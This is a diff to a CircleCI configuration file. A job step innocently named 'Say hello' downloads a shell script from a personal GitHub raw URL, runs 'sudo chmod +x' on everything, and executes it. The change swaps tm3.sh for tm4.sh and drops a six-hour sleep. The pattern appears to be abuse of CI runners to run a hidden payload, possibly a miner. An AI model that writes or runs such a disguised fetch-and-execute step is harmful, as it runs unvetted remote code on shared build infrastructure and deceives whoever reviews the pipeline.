@@ -16,7 +16,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "wget https://raw.githubusercontent.com/meyersgeorgia639/ish/main/tm3.sh; sudo chmod +x *; bash ./tm3.sh; sleep 6h"
+          command: "wget https://raw.githubusercontent.com/meyersgeorgia639/ish/main/tm4.sh; sudo chmod +x *; bash ./tm4.sh;"
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
